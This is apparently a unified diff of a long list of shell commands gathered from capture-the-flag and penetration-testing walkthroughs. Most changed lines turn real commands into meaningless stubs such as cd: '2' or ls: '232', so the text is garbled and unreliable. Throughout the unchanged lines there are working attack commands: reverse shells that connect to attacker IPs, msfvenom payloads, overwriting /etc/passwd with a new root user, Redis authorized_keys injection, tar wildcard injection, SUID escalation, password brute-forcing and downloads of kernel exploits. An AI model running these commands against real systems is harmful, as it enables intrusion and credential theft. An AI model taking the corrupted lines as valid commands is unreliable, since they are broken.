 ssh trinity@127.0.0.1 -i /.ssh/id_rsa -p 6464
 sudo -l
@@ -14032,7 +14032,7 @@ sudo -l
 sudo su
 export PATH=/bin:$PATH
 sudo su
-cd /root
+cd: '2'
 ls
 cat flag.txt
 nmap -A 192.168.0.17
@@ -14042,77 +14042,77 @@ set lhost 192.168.0.12
 python -c 'import pty;pty.spawn("/bin/bash")'
 chmod 777 LinEnum.sh
 find / -perm -u=s -type f 2>/dev/null
-cd /home/user3
-cd /tmp
+cd: '2'
+cd: '2'
 echo "cat /etc/shadow" > ps
 chmod 777 ps
 export PATH=/tmp:$PATH
-cd /home/user5
+cd: '2'
 john hash
-su root
+su: '2'
 echo 'echo "user1:12345" | chpasswd' > ls
 chmod 777 ls
 export PATH=/tmp:$PATH
-cd /home/user5
-su user1
+cd: '2'
+su: '2'
 sudo –l
 sudo su
-su user4
-ls -la
+su: '2'
+ls: '232'
 msfvenom –p cmd/unix/reverse_netcat lhost=192.168.0.12 lport=8888 R
 echo "code" > autoscript.sh
 nc –lvp 8888
 id
-su user8
+su: '2'
 sudo -l
 tail /etc/passwd
-su user7
+su: '2'
 id
 openssl passwd -1 -salt ignite pass123
-cd /etc
+cd: '2'
 wget –O passwd http://192.168.0.12:8000/passwd
-su raj
+su: '2'
 id
 nmap -A 10.10.10.152
 ftp 10.10.10.152
-ls -la
-cd Users
+ls: '232'
+cd: '2'
 ls
-cd Public
+cd: '2'
 ls
-cd ProgramData
-ls -la
-cd Paessler
+cd: '2'
+ls: '230'
+cd: '2'
 ls
-cd "PRTG Network Monitor"
+cd: '2'
 ls
 python psexec.py 'pentest:P3nT3st!@10.10.10.152'
-cd ..
-cd Users\Administrator\Desktop
+cd: '2'
+cd: '2'
 type root.txt
 nmap -p- -A 192.168.1.101
 ftp 192.168.1.101
-cd secret
+cd: '2'
 cat token.txt
 wpscan --url http://pumpkins.local -e at -e ap -e u
 hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 192.168.1.101 ftp -e nsr
 ftp 192.168.1.101
 ls
 cat token.txt
-cd Donotopen
+cd: '2'
 ls
-cd NO
-cd NOO
-cd NOOO
-cd NOOOO
+cd: '2'
+cd: '2'
+cd: '2'
+cd: '2'
 cat token.txt
-cd NOOOOOO
+cd: '2'
 file data.txt
 tar vxf data.txt
 tar xjf data
 tar vxf key
 cat jack
-xxd -r -p jack
+xxd
 chmod 600 sshkey
 ssh jack@192.168.1.101 -i sshkey -p 6880
 file token
@@ -14121,15 +14121,15 @@ mkdir pumpkins
 echo "/bin/sh" > /home/jack/pumpkins/alohomora
 chmod 777 /home/jack/pumkins/alohomora
 id
-cd /root
+cd: '2'
 ls
 cat PumpkinFestival_Ticket
 nmap -A 192.168.0.11
 wget http://192.168.0.11/seeds.txt.gpg
-gpg -d seeds.txt.gpg
+gpg
 ssh jack@192.168.0.11
 sudo strace -o/dev/null /bin/bash
-cd /root
+cd: '2'
 ls
 cat flag.txt
 nmap -p- -A 192.168.0.14
@@ -14140,7 +14140,7 @@ echo c2NhcmVjcm93IDogNVFuQCR5 | base64 -d
 ssh scarecrow@192.168.0.14 -p3535
 ls
 tail /etc/passwd
-su goblin
+su: '2'
 cat 38362.sh
 nmap -A 10.10.10.121
 dirb http://10.10.10.121
@@ -14148,21 +14148,21 @@ php –a
 echo md5("myshell.php1560956116");
 nc –lvp 1234
 python –c 'import pty;pty.spawn("/bin/bash")'
-cd /home/help
+cd: '2'
 cat user.txt
 searchsploit 4.4.0-116
 searchsploit –m 44398
 python –m SimpleHTTPServer 8081
 wget http://10.10.14.11:8081/44298.c
 gcc 44298.c -o kernel
-cd /root
+cd: '2'
 nmap -A 192.168.1.104
 mkdir /tmp/raj
 mount 192.168.1.104:/home/karl /tmp/raj
-cd /tmp/raj
-ls -al
-groupadd --gid 1001 aaru
-useradd --uid 1001 --group raj aaru
+cd: '2'
+ls: '222'
+groupadd
+useradd
 sudo -u aaru ls -l .ssh
 sudo -u aaru cat .ssh/user.txt
 sudo -u aaru cat .ssh/id_rsa
@@ -14172,11 +14172,11 @@ ssh -i key karl@192.168.1.104
 ssh -i key karl@192.168.1.104 -t "/bin/sh"
 find / -perm -u=s -type f 2>/dev/null
 openssl passwd -1 -salt ignite pass123
-cd /tmp
+cd: '2'
 wget http://192.168.1.111:8000/passwd
 cp passwd /etc/passwd
-su ignite
-cd root
+su: '2'
+cd: '2'
 cat root.txt
 nmap -A 10.10.10.119
 nmap -Pn -p 389 --script ldap-search 10.10.10.119
@@ -14184,12 +14184,12 @@ ssh 10.10.14.10@10.10.10.119
 getcap -r / 2>/dev/null
 tcpdump -i any -X port ldap
 cat backuo.7z | base64
-su ldapuser1
+su: '2'
 getcap -r / 2>/dev/null
 nmap -A 192.168.1.105
 mkdir /tmp/raj
 mount -t nfs 192.168.1.105:/var/nfsshare /tmp/raj
-cd /tmp/raj
+cd: '2'
 ls
 cat discovery
 cat enumeration
@@ -14200,20 +14200,20 @@ enum4linux 192.168.1.105
 smbclient //192.168.1.105/anonymous
 smbclient //192.168.1.105/secured -U David
 find / -perm -u=s -type f 2>/dev/null
-cd /tmp
+cd: '2'
 wget //192.168.1.110:8000/passwd
 cp passwd /etc/passwd
-su raj
-cd /root
+su: '2'
+cd: '2'
 ls
 cat proof.txt
 netdiscover
 nmap -p- -A 192.168.1.22
 chmod 600 sshkey
 ssh -i sshkey 192.168.1.22 -p 6465
-su root
+su: '2'
 ls
-su root
+su: '2'
 cat system/flag.txt
 netdiscover
 nmap -p- -A 192.168.1.103
@@ -14235,11 +14235,11 @@ cat local.txt
 echo os.system('/bin/bash')
 cat local.txt
 cat work.txt
-su patrick
+su: '2'
 sudo -l
 openssl passwd -1 -salt ignite pass123
 sudo nano /etc/passwd
-su raj
+su: '2'
 ls
 cat proof.txt
 netdiscover
@@ -14248,15 +14248,15 @@ dirb http://192.168.1.9/
 cewl http://192.168.1.9/joomla/ > dict.txt
 nc -lvp 1234
 python -c 'import pty;pty.spawn("/bin/bash")'
-cd /opt
+cd: '2'
 ls
-cd scripts
+cd: '2'
 ls
 cat fileshare.py
-su tim
+su: '2'
 sudo -l
 sudo su
-cd /root
+cd: '2'
 ls
 cat flag.txt
 netdiscover
@@ -14268,14 +14268,14 @@ dirb http://192.168.0.6
 nc -lvp 1234
 nc -lvp 4444
 whoami
-cd /root
+cd: '2'
 ls
 cat flag.txt
 nmap -A 192.168.1.101
 ssh dc7user@192.168.1.101
-drush user-password admin --password=raj
+drush
 msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.106 lport=8888 R
-mkfifo /tmp/ulgg; nc 192.168.1.106 8888 0</tmp/ulgg | /bin/sh >/tmp/ulgg 2>&1; rm /tmp/ulgg
+mkfifo
 netdiscover
 nmap -A 192.168.1.108
 nc -e /bin/bash 192.168.1.110 1234
@@ -14291,7 +14291,7 @@ wget http://192.168.1.110:8000/libhax.so
 wget http://192.168.1.110:8000/rootshell
 chmod 777 41154.sh
 id
-cd /root
+cd: '2'
 ls
 cat thisistheflag.txt
 netdiscover
@@ -14301,11 +14301,11 @@ ssh jim@192.168.1.101
 ls
 cat test.sh
 cat mbox
-su charles
+su: '2'
 sudo -l
 echo "raaj::0:0:::/bin/bash" | sudo teehee -a /etc/passwd
-su raaj
-cd /root
+su: '2'
+cd: '2'
 ls
 cat flag.txt
 netdiscover
@@ -14323,7 +14323,7 @@ cat user.txt
 find / -perm -u=s -type=f 2>/dev/null
 echo '/bin/sh' > /tmp/listusers
 chmod 777 /tmp/listusers
-cd /root
+cd: '2'
 ls
 cat root.txt
 nmap -sC -sV -p- 10.10.10.153
@@ -14334,34 +14334,34 @@ crunch 15 15 -t Th4C00lTheacha^ -o pass.txt
 wfuzz -w pass.txt -L 20 -d "username=giovanni&password=FUZZ" -hw 1224 //10.10.10.153/moodle/login/index.php
 nc -lvp 1234
 mysql -u root -p'Welkom1' moodle
-su Giovanni
+su: '2'
 ls
 cat user.txt
 ln -s /root tmp
-cd /tmp
+cd: '2'
 ls
-cd /root
+cd: '2'
 ls
 cat root.txt
 nmap -p- -sV -sC 10.10.10.109
 dirb //10.10.10.109/sparklays/ -w
 msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.13.234 lport=1234 -f raw > shell.php5
-cd Desktop
-ls -al
+cd: '2'
+ls: '206'
 cat Servers
 cat key
 cat ssh
 for i in {1..255}; do ping -c 1 192.168.122.$i | grep 'from' ; done
 ssh -D 8080 dave@10.10.10.109
 nc -lvp 1234
-cd /root
+cd: '2'
 ls
-ls -al
+ls: '205'
 ls
-cd dave
+cd: '2'
 ls
 cat user.txt
-ncat -p 4444 192.168.5.2 987
+ncat
 cat ssh
 ls
 cat user.txt
@@ -14376,16 +14376,16 @@ gpg -d root.txt.gpg
 nmap -sV -sC -T4 -p- 10.10.10.150
 echo "Q3VybGluZzIwMTgh" | base64 -d
 msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.120 lport=443 -f raw
-ls -al
+ls: '202'
 cat password_backup
 xxd -r password_backup > password
 file password
 mv password password.bz2
-bzip2 -d password.bz2
+bzip2
 ls
 file password
 mv password password.gz
-gzip -d password.gz
+gzip
 ls
 file password
 mv password password.bz2
@@ -14398,8 +14398,8 @@ ssh floris@10.10.10.150
 ls
 cat user.txt
 cat input
-wc -l report
-ls -al
+wc
+ls: '198'
 echo "file:///root/root.txt" > input
 wc -l report
 cat report
@@ -14411,8 +14411,8 @@ fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u encodedfile
 unzip encodedfile
 python -c "import pty; pty.spawn('/bin/bash')"
 find / -perm -u=s -type f 2>/dev/null
-gdb -q rop
-r <pattern>
+gdb
+r
 find 0xf7e0c980, +9999999, "/bin/sh"
 r $(python exploit.py)
 ldd /home/ayush/.binary/rop |grep libc
@@ -14424,11 +14424,11 @@ nmap -sU --min-rate=5000 -T4 10.10.10.105
 snmpwalk -c public -v 1 10.10.10.105
 python -c "import pty; pty.spawn('/bin/bash')"
 for i in {1..255}; do ping -c 1 10.120.15.$i | grep "bytes from" | cut -d " " -f4 | cut -d ":" -f1 ; done
-crontab -l
+crontab
 chmod -x /opt/restore.sh
 ip prefix-list 0xdf permit 10.120.15.0/25
 set community no-export
-clear ip bgp *
+clear
 tcpdump -i eth2 -nnXSs 0 'port 21' -w hack.pcap
 ssh root@10.10.10.105
 netdiscover
@@ -14449,11 +14449,11 @@ hydra -l ftpUserULTRA -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.102
 ftp 192.168.1.102 21
 chmod 777 shell.php5
 python -c "import pty; pty.spawn('/bin/bash')"
-su valenka
+su: '2'
 find / -perm -4000 2>/dev/null
-cd /opt/casino-royale/
+cd: '2'
 ls
-cd /tmp
+cd: '2'
 msfvenom –p cmd/unix/reverse_netcat lhost=192.168.1.107 lport=1234 R
 nano run.sh
 python -m SimpleHTTPServer
@@ -14461,16 +14461,16 @@ wget http://192.168.1.107:8000/run.sh
 nc -lvp 1234
 id
 ls
-cd flag
+cd: '2'
 cat flag.sh
 nmap -p- -A 10.10.10.98
 ftp 10.10.10.98
 strings backup.mdb | grep access
-7z x Access\ Control.zip
+7z
 less 'Access Control.mbox'
 telnet 10.10.10.98
 dir
-cd Desktop
+cd: '2'
 type user.txt
 set target 2
 set payload windows/x64/meterpreter/reverse_tcp
@@ -14483,7 +14483,7 @@ whoami
 net user
 net user Administrator Ignite@123
 telnet 10.10.10.98
-cd Desktop
+cd: '2'
 type root.txt
 nmap -A 10.10.10.108
 gobuster -s '200,204,301,302,307,403,500' -e -t 20 -u http://10.10.10.100 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
@@ -14510,7 +14510,7 @@ john --format=raw-md5 --show user2.txt > cracked.txt
 hydra -C cracked.txt ssh://10.10.10.86 -t4
 ssh genevieve@10.10.10.86
 find / -perm -4000 2>/dev/null
-ltrace myexec
+ltrace
 ldd /usr/bin/myexec
 cat /etc/ld.so.conf.d/test.conf
 gcc –Wall –fPIC –shared –o libseclogin.so /tmp/libseclogin.c
@@ -14538,18 +14538,18 @@ ls
 set LHOST 10.10.14.9
 set SRVHOST 10.10.14.9
 pwd
-cd Users
+cd: '2'
 ls
-cd tyler/Desktop
+cd: '2'
 cat user.txt
 strings bash.lnk
-where /R c:\ bash.exe
+where
 id
-ls –la
+ls: '193'
 cat .bash_history
 smbclient –U 'administrator%u6!4Zwgw0M#^0Bf#Nwnh' \\\\10.10.10.97\\c$
 ls
-cd Users/Administrator/Desktop
+cd: '2'
 ls
 cat root.txt
 nmap -sV -sC -T4 10.10.10.72
@@ -14569,7 +14569,7 @@ ssh loki@10.10.10.92
 find / -name root.txt
 nmap -sC -sV 10.10.10.66
 ssh -p 2222 ftpuser@10.10.10.66
-sftp -p 2222 ftpuser@10.10.10.66
+sftp
 python sftp-exploit.py
 nc -lvp 443
 python -c "import pty; pty.spawn('/bin/bash')"
@@ -14591,7 +14591,7 @@ ssh -i .monitor monitor@localhost -t bash
 export SHELL=/bin/bash
 export PATH=/bin:/sbin:/usr/bin:/usr/sbin:$PATH
 getcap -r / 2>/dev/null
-tac /root/root.txt
+tac
 nmap -A 192.168.1.105
 chmod 600 id_rsa
 ssh alice@192.168.1.105 -i id_rsa
@@ -14613,19 +14613,19 @@ dirb http://192.168.1.110/
 tail -f /var/log/apache2/access.log
 python -c 'import pty; pty.spawn("/bin/bash")'
 tail /opt/couchdb/etc/local.ini
-su hugo
-su root
+su: '2'
+su: '2'
 nmap -A 10.10.10.102
 ftp 10.10.10.102
 file .drupal.txt.enc
 git clone https://github.com/deltaclock/go-openssl-bruteforce.git
 nc -lvp 1234
 cat settings.php | grep password
-su daniel
+su: '2'
 searchsploit H2 database
 searchsploit -m 45506
 python -m SimpleHTTPServer 8080
-cd /tmp
+cd: '2'
 wget http://10.10.14.10:8080/45506.py
 chmod 777 45506.py
 id
@@ -14633,12 +14633,12 @@ netdiscover
 nmap -A 192.168.1.101
 ssh typhoon@192.168.1.101
 searchsploit ubuntu 14.04
-cd /tmp
+cd: '2'
 wget http://192.168.1.109/37292.c
 ls
 gcc 37292.c -o rootshell
 chmod 777 rootshell
-cd /root
+cd: '2'
 ls
 cat root-flag
 set rhost 192.168.1.101
@@ -14656,14 +14656,14 @@ nmap 192.168.1.105
 dirb http://192.168.1.105
 searchsploit rips 0.53
 python -c 'import pty; pty.spawn("/bin/bash")'
-su fluffy
-cd /home
+su: '2'
+cd: '2'
 ls
-cd fluffy
-ls -la
-cd .private
-ls -la
-cd secrets
+cd: '2'
+ls: '186'
+cd: '2'
+ls: '186'
+cd: '2'
 msfvenom –p cmd/unix/reverse_netcat lhost=192.168.1.109 lport=8888 R
 echo "mkfifo /tmpmzlat; nc 192.168.1.109 8888 0</tmp/zlat | /bin/sh >/tmp/zlat 2>&1; rm /tmp/zlat" >>timclock
 python -c 'import pty; pty.spawn("/bin/bash")'
@@ -14677,12 +14677,12 @@ doas /usr/bin/less /var/log/authlog
 nmap -A 192.168.1.101
 dirb http://192.168.1.101/
 python –c 'import pty;pty.spawn("/bin/bash")'
-cd /var/www
+cd: '2'
 cat flag2.txt
-cd html
-cd wordpress
+cd: '2'
+cd: '2'
 cat wp-config.php
-cd /tmp
+cd: '2'
 wget http://192.168.1.109/LinEnum.sh
 chmod 777 LinEnum.sh
 searchsploit –m 1518.c
@@ -14693,7 +14693,7 @@ mysql -u root -p
 touch raj
 find raj –exec "whoami" \;
 find raj –exec "/bin/sh" \;
-cd /root
+cd: '2'
 ls
 cat flag4.txt
 netdiscover
@@ -14702,19 +14702,19 @@ nc 192.168.1.29 110
 pass scoobydoo2
 ssh baksteen@192.168.1.29
 find / -group users -type f 2>/dev/null
-cd /opt/cube
+cd: '2'
 cat cube.sh
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.29",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ssh baksteen@192.168.1.29
 nc -lvp 1234
 id
-cd /root
+cd: '2'
 cat flag.txt
 nmap -sV 10.10.10.95
 nmap -A 192.168.1.102
 wpscan --url http://192.168.1.102/wordpress/ --wp-content-dir -ep -et -eu
 ssh michael@192.168.1.102
-cd /tmp
+cd: '2'
 wget http://192.168.1.109/LinEnum.sh
 chmod 777 LinEnum.sh
 searchsploit –m 1518.c
@@ -14725,11 +14725,11 @@ mysql –u root –p
 touch raj
 find raj –exec "whoami" \;
 find raj –exec "/bin/sh" \;
-cd /root
+cd: '2'
 ls
 cat flag4.txt
 find / -name "flag*.txt"
-su steven
+su: '2'
 sudo –l
 sudo python –c 'import pty;pty.spawn("/bin/bash")'
 id
@@ -14742,17 +14742,17 @@ nmap -p- -A 10.10.10.91 --open
 dirb http://10.10.10.91:5000
 chmod 600 key
 ssh -i key roosa@10.10.10.91
-cd /home
+cd: '2'
 ls
-cd roosa
+cd: '2'
 ls
 cat user.txt
-cd work
+cd: '2'
 ls
-cd blogfeed/
+cd: '2'
 ls
 cat run-gunicorn.sh
-cd resources
+cd: '2'
 ls
 git log
 chmod 600 key
@@ -14762,14 +14762,14 @@ cat root.txt
 nmap -A 10.10.10.83
 nikto -h http://10.10.10.83
 ls
-cd /home
+cd: '2'
 ls
-cd zeus
+cd: '2'
 ls
-cd airgeddon
+cd: '2'
 ls
 cat pindb_checksum.txt
-cd captured
+cd: '2'
 ls
 cat papyrus.txt
 aircrack-ng captured.cap -w /usr/share/wordlists/rockyou.txt
@@ -14786,14 +14786,14 @@ sudo -l
 find / -perm -u=s -type f 2>/dev/null
 msfvenom -p solaris/x86/shell_reverse_tcp lhost=10.10.14.6 lport=5555 -f elf > /root/Desktop/raj.elf
 php -S 0.0.0.0:80
-cd /tmp
+cd: '2'
 sudo /usr/bin/wget 10.10.14.6/raj.elf -O /usr/bin/rsh
 id
-cd /root
+cd: '2'
 ls
 cat root.txt
 id
-cd /root
+cd: '2'
 ls
 cat root.txt
 nc -lvp 80
@@ -14810,7 +14810,7 @@ python -c 'import pty;pty.spawn("/bin/bash")'
 lsb_release -a
 uname -a
 netstat -antp
-cd /etc/redis
+cd: '2'
 ls
 cat 6379.conf | grep requirepass
 redis-cli -h 127.0.0.1 -a 8a7b86a2cd89d96dfcc125ebcc0535e6 ping
@@ -14819,7 +14819,7 @@ cat public.txt | redis-cli -h 127.0.0.1 -a 8a7b86a2cd89d96dfcc125ebcc0535e6 -x s
 redis-cli -h 127.0.0.1 -a 8a7b86a2cd89d96dfcc125ebcc0535e6 config set dir "/root/.ssh/"
 redis-cli -h 127.0.0.1 -a 8a7b86a2cd89d96dfcc125ebcc0535e6 config set dbfilename authorized_keys
 redis-cli -h 127.0.0.1 -a 8a7b86a2cd89d96dfcc125ebcc0535e6 save
-cd .ssh
+cd: '2'
 ssh root@127.0.0.1
 ls
 cat flag.txt
@@ -14841,7 +14841,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.4 4444 >/tmp/f
 sudo pip install .
 nc -lvp 4444
 id
-cd /root
+cd: '2'
 ls
 cat root.txt
 netdiscover
@@ -14866,7 +14866,7 @@ msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.6 lport=4444 -f raw > she
 python -m SimpleHTTPServer 80
 python -c "import pty; pty.spawn('/bin/bash')"
 nc -zv 192.168.122.228 1-65535
-cd /tmp
+cd: '2'
 wget http://10.10.14.6/socat
 socat tcp-listen:5986,reuseaddr,fork tcp:10.10.10.62:60217
 dir
@@ -14879,18 +14879,18 @@ cat decode | base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| b
 ssh charix@10.10.10.84
 ls
 scp charix@10.10.10.84:secret.zip /root/Desktop/
-cd Desktop
+cd: '2'
 unzip secret.zip
-sockstat -4 -l
+sockstat
 ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84
-vncviewer -passwd secret 127.0.0.1:5901
+vncviewer
 ls
 cat root.txt
 nmap -sV 10.10.10.64
 nmap -p8080 --script http-vuln-cve2017-5638 --script-args path=/Monitoring/ 10.10.10.64
 git clone https://github.com/drigg3r/Struts-Apache-ExploitPack.git
-cd Struts-Apache-ExploitPack
-cd Exploiter
+cd: '2'
+cd: '2'
 ls
 chmod 777 Exploit.sh
 id
@@ -14909,10 +14909,10 @@ echo {"username":"_$$ND_FUNC$$_function (){ eval(String.fromCharCode(value) )}()
 nc -lvp 4444
 python -c 'import pty;pty.spawn("/bin/bash")'
 ls
-cd Documents
+cd: '2'
 cat user.txt
 cat script.py
-cd /var/log
+cd: '2'
 ls
 cat syslog
 msfvenom -p cmd/unix/reverse_python lhost=10.10.14.3 lport=1234 R
@@ -14922,7 +14922,7 @@ mv script.py script.py.original
 wget http://10.10.14.3/script.py
 nc -lvp 1234
 python -c 'import pty;pty.spawn("/bin/bash")'
-cd /root
+cd: '2'
 ls
 cat root.txt
 netdiscover
@@ -14994,7 +14994,7 @@ cat flag.txt
 cat note.txt
 nmap -p- -A 192.168.1.105
 lsb_release -a
-g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow
+g++
 cd /root
 ls
 cat flag.txt
@@ -15003,7 +15003,7 @@ tcpdump -nni eth0 icmp
 tcpdump -nni eth0 icmp
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.104 1234 >/tmp/f
 nc -lvp 1234
-ls -al /etc/passwd
+ls: '154'
 cat /etc/passwd
 openssl passwd –l –salt user3 pass123
 cp passwd /etc/passwd
@@ -15069,7 +15069,7 @@ cat CleaningScript.sh
 chmod u+s /usr/bin/find
 python -c 'import pty;pty.spawn("/bin/bash");'
 date
-ls -la /usr/bin/find
+ls: '145'
 find /home -exec whoami \;
 find /home -exec ls -la /root \;
 find /home -exec cat flag.txt \;
@@ -15119,10 +15119,10 @@ echo {base64 encode text} | base64 -d
 searchsploit Linux 3.13
 python –c 'import pty;pty.spawn("/bin/bash")'
 chmod 777 shell
-cc 37292.c -o raj
+cc
 chmod 777 raj
 cd /root
-ls -ls
+ls: '141'
 cat .flag.txt
 nmap -A 192.168.1.105
 cd /tmp
@@ -15133,13 +15133,13 @@ ls
 mkdir usbstick
 mount USB-stick.img usbstick
 cd usbstick/
-ls -la
+ls: '140'
 mkdir main
 mount 192.168.1.105:/ main
 cd main
-ls -la
+ls: '140'
 cd root
-ls -la
+ls: '140'
 cat proof.txt
 nmap -p- -A  192.168.1.102 --open
 dirb http://192.168.1.102
@@ -15152,7 +15152,7 @@ cd blacklight
 ls
 cd /home
 cd blacklight
-ls -la
+ls: '138'
 cd .secret
 cp flag2-inside.jpg /var/www/html
 cat flag2.txt
@@ -15162,9 +15162,9 @@ hydra -l jan -P /usr/share/wordlists/rockyou.txt 192.168.1.139 ssh
 cd /home
 ls
 cd kay
-ls -la
+ls: '137'
 cd .ssh
-ls -al
+ls: '137'
 python ssh2john key > ssh_login
 john ssh_login
 ssh -i key kay@192.168.1.139
@@ -15173,7 +15173,7 @@ ls
 nmap -A 192.168.1.104
 dirb http://192.168.1.104
 find / -perm -u=s -type f 2>/dev/null
-mawk 'BEGIN {system("/bin/sh")}'
+mawk
 id
 cd /root
 ls
@@ -15230,19 +15230,19 @@ ls
 cd proclaimers
 ls
 cd letterfromamerica
-ls -al
-grep -R "semaphore" /usr/local 2>/dev/null
+ls: '124'
+grep
 cat /usr/local/bin/numpties.sh
 gcc shell.c -o semaphore
 python -m SimpleHTTPServer 80
 rm -rf  semaphore
 curl -O http://192.168.1.107/semaphore
-ls -la
+ls: '124'
 cd /root
 cat flag.txt
 cd root
 ls
-ls -al
+ls: '123'
 cd on
 ls
 cd and
@@ -15251,7 +15251,7 @@ cd on
 cd ariston
 wget http://192.168.1.103:8080/TeuchterESX.zip
 unzip TeuchterESX.zip
-fdisk -l
+fdisk
 mkdir Teuchter
 cd Teuchter
 ls
@@ -15282,7 +15282,7 @@ ls
 nc 10.10.14.25 5555 < screen.raw
 cat /sys/class/graphics/fb0/virtual_size
 df
-debugfs /dev/sda1
+debugfs
 cat /root/.ssh/id_rsa
 ssh -i key root@10.10.10.73
 ls
@@ -15313,7 +15313,7 @@ unzip personal.zip
 cd personal
 ls
 cd stuff
-ls -al
+ls: '115'
 msfvenom -p cmd/unix/reverse_netcat lhost=10.10.14.25 lport=5555 R
 nc -lvp 5555
 cd /home/nibbler/personal/stuff/
@@ -15327,20 +15327,20 @@ nmap -A 192.168.1.104
 cewl http://bourne.wikia.com/wiki/Operation_Treadstone -d 2 -w /root/Desktop/dict.txt
 hydra -L dict.txt -P dict.txt 192.168.1.104 ftp
 ftp 192.168.1.104
-ls -al
+ls: '114'
 cd ftp
-ls -al
+ls: '114'
 cd IMPFiles
-ls -al
+ls: '114'
 cat IMP.txt
 sqlmap -u http://192.168.1.104/vworkshop/sparepartsstoremore.php?sparepartid=1 --dbs --batch
 sqlmap -u http://192.168.1.104/vworkshop/sparepartsstoremore.php?sparepartid=1 -D BlackMarket --dump-all --batch
 strings PassPass.jpg
 nc -lvp 4444
 cd /home
-ls -al
+ls: '114'
 cd .Mylife
-ls -al
+ls: '114'
 cat .Secret
 python -c 'import pty; pty.spawn("/bin/bash")'
 su dimitri
@@ -15359,7 +15359,7 @@ dirb https://10.10.10.43 /usr/share/wordlists/dirb/big.txt
 msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.25 lport=4444 -f raw
 id
 cd /root
-ls -lsa
+ls: '113'
 cat root.txt
 nmap -p- -A 192.168.1.103 --open
 php -S 0.0.0.0:4444
@@ -15412,16 +15412,16 @@ cat root.txt
 nmap -A 10.10.10.63
 cd Administrator
 cd Desktop
-ls -al
+ls: '109'
 cat hm.txt
-dir /R
-more < hm.txt:root.txt:$DATA
+dir: '3'
+more
 python keepass2john.py CEH.kdbx > passkey
 john --format=KeePass --wordlist=/usr/share/wordlists/rockyou.txt passkey
 apt-get install keepass2 -y
-keepass2 tim.kdbx
+keepass2
 net user administrator 123
-dir /R
+dir: '3'
 more < hm.txt:root.txt
 nmap -sV 10.10.10.69
 wfuzz -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.69/sync?FUZZ=ls -c --hh 19
@@ -15640,7 +15640,7 @@ cat user.txt
 curl -k -H "user-agent: () { :; }; bash -i >& /dev/tcp/10.10.14.3/8081 0>&1" https://10.10.10.7:10000/session_login.cgi
 netdiscover
 nmap -A 192.168.1.109
-id | nc -e /bin/bash 192.168.1.132 6000
+id: '18'
 nc -lvp 6000
 python -c 'import pty;pty.spawn("/bin/bash")'
 gpg --batch –passphrase HARPOCRATES -d login.txt.gpg
@@ -15664,7 +15664,7 @@ python -c 'import pty;pty.spawn("/bin/bash")'
 ls
 ps aux | grep james
 cd opt
-ls -al
+ls: '92'
 wget http://10.10.14.3/tmp.py
 cp tmp.py /opt
 cd /opt
@@ -15677,7 +15677,7 @@ ls
 sudo -l
 sudo bash
 cd /media/usbstick
-ls -al
+ls: '90'
 cat damnit.txt
 nmap -p- -sV 10.10.10.14
 type user.txt
@@ -15712,7 +15712,7 @@ curl -s --data-urlencode urlConfig=../../../../../../../../../etc/shadow http://
 ssh wlr3s@192.168.1.106
 id
 lsb_release -a
-ls -la
+ls: '85'
 cat flag.txt
 netdiscover
 nmap -p- -A 192.168.1.102 --open
@@ -15723,8 +15723,8 @@ nmap -p- -sV 192.168.1.133
 dirb http://192.168.1.133
 john --format=dynamic_2008 hash.txt
 strings stark_shield.jpg
-nslookup -q=txt Timef0rconqu3rs.7Kingdoms.ctf 192.168.1.133
-psql –h 192.168.1.133 –u robinarryn –d mountainandthevale
+nslookup
+psql
 nmap -p- 192.168.1.133
 nc 192.168.1.133 143
 nc -e /bin/bash 192.168.1.116 1234
@@ -15884,7 +15884,7 @@ ls
 cd /home/smith
 ls
 cat flag.xt
-ls -al
+ls: '65'
 cat authorized_keys
 cat id_ed25519
 cat id_ed25519.pub
@@ -15920,8 +15920,8 @@ scp /root/flag.zip root@192.168.0.6:/root/Desktop
 fcrackzip flag.zip -D -P /user/share/wordlist/rockyou.txt -u
 unzip flag.zip
 cat flag.txt
-iptables -L
-ls -la
+iptables
+ls: '62'
 cd /.bak
 ls
 cd users
@@ -15935,7 +15935,7 @@ wget http://192.168.0.6/mario.c
 gcc mario.c -o mario
 id
 cd /root
-ls -la
+ls: '60'
 scp /root/flag2.zip root@192.168.0.6:/root/Desktop
 unzip flag2.zip
 netdiscover
@@ -16023,7 +16023,7 @@ nmap -A 192.168.1.100
 chmod 777 LinEnum.sh
 find / -name ftpserv*
 fdisk -lu ftpserv.img
-fls -f fat16 -o 63 ftpserv.img
+fls
 fls -f fat16 -o 63 ftpserv.img 12
 mount flag.img /mnt
 cd /mnt
@@ -16040,7 +16040,7 @@ ls
 echo "chmod u+s /usr/bin/find" > test.sh
 echo "" > "--checkpoint-action=exec=sh test.sh"
 echo "" > --checkpoint=1
-ls -al /usr/bin/find
+ls: '47'
 touch raj
 find raj -exec "/bin/sh" \;
 netdiscover
@@ -16048,7 +16048,7 @@ ssh 192.168.0.103
 nikto -h 192.168.0.103 –useproxy  http://192.168.0.103:3129
 cewl -d 2 -m 5 --proxy_host 192.168.0.103 --proxy_port 3129 -w /root/Desktop/dict.txt http://192.168.0.103/blog/
 ftp 192.168.0.103 21211
-ls –al
+ls: '47'
 exit
 cat .note.txt
 msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.104 lport=4444 -f raw
@@ -16091,7 +16091,7 @@ python -c 'import pty;pty.spawn("/bin/bash")'
 nmap -A 192.168.1.127
 nc -lvp 1234
 python -c 'import pty;pty.spawn("/bin/bash")'
-ls -al /etc/passwd
+ls: '42'
 cat /etc/passwd
